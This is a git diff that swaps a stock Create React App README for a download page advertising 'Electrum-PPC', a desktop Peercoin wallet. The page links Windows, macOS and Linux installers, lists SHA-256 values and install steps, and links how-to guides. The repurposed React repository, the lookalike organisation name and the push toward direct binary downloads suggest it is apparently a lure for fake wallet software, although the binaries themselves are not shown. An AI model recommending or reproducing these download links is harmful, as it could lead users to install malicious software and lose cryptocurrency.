@@ -1,70 +1,117 @@
-# Getting Started with Create React App
+<p align="center"><img src="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/raw/HEAD/assets/banner-app.png" alt="Electrum-PPC desktop Peercoin wallet" width="100%"></p>
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+<h1 align="center">Electrum-PPC</h1>
 
-## Available Scripts
+<p align="center">A desktop Peercoin wallet for Windows, macOS and Linux, built on Electrum.</p>
 
-In the project directory, you can run:
+<p align="center">
+  <img src="https://img.shields.io/badge/LICENSE-MIT-6FD579?style=for-the-badge&labelColor=050B16" alt="License MIT">
+  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0"><img src="https://img.shields.io/badge/RELEASE-v0.16.0-6FD579?style=for-the-badge&labelColor=050B16" alt="Release v0.16.0"></a>
+</p>
 
-### `npm start`
+---
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+## 📦 Downloads - v0.16.0
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+<p align="center">
+  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-6FD579?style=for-the-badge&logo=windows&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for Windows"></a>
+  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-6FD579?style=for-the-badge&logo=apple&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for macOS"></a>
+  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-6FD579?style=for-the-badge&logo=linux&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for Linux"></a>
+</p>
 
-### `npm test`
+| Platform | File |
+|---|---|
+| 🪟 Windows | [`electrum-ppc-wallet-v0.16.0.exe`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe) |
+| 🍎 macOS | [`electrum-ppc-wallet-v0.16.0.dmg`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg) |
+| 🐧 Linux | [`electrum-ppc-wallet-v0.16.0.zip`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip) |
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+Verify all files against the SHA-256 values below. All versions are listed on the [Electrum-PPC v0.16.0 release page](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0).
 
-### `npm run build`
+<!-- SHA256:START -->
+| File | SHA-256 |
+|---|---|
+| `electrum-ppc-wallet-v0.16.0.exe` | `692fefe9c6a1ca818b6e6142229a3a9b3a8c7b6cbddb52983db92a642df952da` |
+| `electrum-ppc-wallet-v0.16.0.dmg` | `784903a7cb5a5ea6a86d7d08dc0e99567820cbe6e8b433e498895908e4220950` |
+| `electrum-ppc-wallet-v0.16.0.zip` | `6c5d1b4684e75b4f4b2d0b2dbe684265ecd869643ac229d8b8f935d6f5c569b1` |
+<!-- SHA256:END -->
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+> [!IMPORTANT]
+> Only download from this GitHub release page.
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
+---
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+## 🧩 Install
 
-### `npm run eject`
+<details open>
+<summary>🪟 Windows</summary>
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
+1. Download [`electrum-ppc-wallet-v0.16.0.exe`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe) from the release.
+2. Compare its SHA-256 with the value on the release page: `Get-FileHash .\electrum-ppc-wallet-v0.16.0.exe -Algorithm SHA256`
+3. Run the installer and follow the prompts.
+4. Create or restore a wallet, then write your seed phrase on paper before receiving funds.
 
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
+</details>
 
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
+<details>
+<summary>🍎 macOS</summary>
 
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
+1. Download [`electrum-ppc-wallet-v0.16.0.dmg`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg) from the release.
+2. Compare its SHA-256 with the value on the release page: `shasum -a 256 electrum-ppc-wallet-v0.16.0.dmg`
+3. Open the disk image and drag Electrum-PPC into Applications.
+4. Create or restore a wallet, then write your seed phrase on paper before receiving funds.
 
-## Learn More
+</details>
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+<details>
+<summary>🐧 Linux</summary>
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+1. Download [`electrum-ppc-wallet-v0.16.0.zip`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip) from the release.
+2. Compare its SHA-256 with the value on the release page: `sha256sum electrum-ppc-wallet-v0.16.0.zip`
+3. Extract the archive: `unzip electrum-ppc-wallet-v0.16.0.zip`
+4. Start the wallet from the extracted folder, then write your seed phrase on paper before receiving funds.
 
-### Code Splitting
+</details>
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+---
 
-### Analyzing the Bundle Size
+## ✨ Features
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
+- Desktop Peercoin wallet for Windows, macOS and Linux
+- Lightweight access: no full local copy of the Peercoin chain is required
+- Seed phrase backup and restore, with recovery planned before first use
+- Send and receive Peercoin (PPC) from a familiar Electrum-based interface
+- One release page with direct installers and published SHA-256 checksums
 
-### Making a Progressive Web App
+---
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+## 📚 Guides
 
-### Advanced Configuration
+| Guide | What it covers |
+|---|---|
+| [Install Electrum-PPC on Windows](https://github.com/Peercoin-developments/learn/blob/main/how-to/install-electrum-ppc-on-windows.md) | Download, verify and install the Windows package. |
+| [Verify an Electrum-PPC Download Checksum](https://github.com/Peercoin-developments/learn/blob/main/how-to/verify-electrum-ppc-download-checksum.md) | Check a download against its published SHA-256. |
+| [Electrum-PPC Backup and Restore](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-backup-and-restore.md) | Protect wallet access before you receive funds. |
+| [Electrum-PPC Not Syncing](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-not-syncing.md) | Work through a wallet that stops updating. |
+| [Send Peercoin with Electrum-PPC](https://github.com/Peercoin-developments/learn/blob/main/how-to/send-peercoin-with-electrum-ppc.md) | Prepare, review and send a Peercoin payment. |
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+[Browse all Electrum-PPC guides in the learn hub](https://github.com/Peercoin-developments/learn)
 
-### Deployment
+---
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+## 🔐 Security
 
-### `npm run build` fails to minify
+**Electrum-PPC will never ask for your seed phrase, private keys or wallet file; anyone who does is not legitimate.**
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+Electrum-PPC is an independent project built on Electrum; it is not affiliated with or endorsed by the Electrum project.
+
+---
+
+## 💬 Support
+
+Report a problem or ask a question in [Electrum-PPC issues](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/issues). See the [Electrum-PPC v0.16.0 release](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0) and [all releases](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases).
+
+---
+
+## 📄 License
+
+Released under the MIT License. See [LICENSE](LICENSE).
